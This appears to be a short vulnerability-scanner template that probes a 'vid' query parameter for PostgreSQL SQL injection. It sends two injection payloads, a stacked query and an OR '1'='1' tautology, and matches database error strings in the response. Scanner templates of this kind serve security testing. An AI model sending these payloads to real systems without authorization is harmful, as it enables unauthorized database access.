id: sqli3-pg-08
name: 'SQLi pg prefix #7 in vid'
severity: high
type: active
tags:
  - sqli
  - injection
  - pg
description: 'Triggers pg error via vid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      vid:
        - '1''; SELECT 1--'
        - '1'' OR ''1''=''1'' /*'
    matchers:
      - type: regex
        part: body
        regex:
          - 'PostgreSQL'
          - 'pg_query'
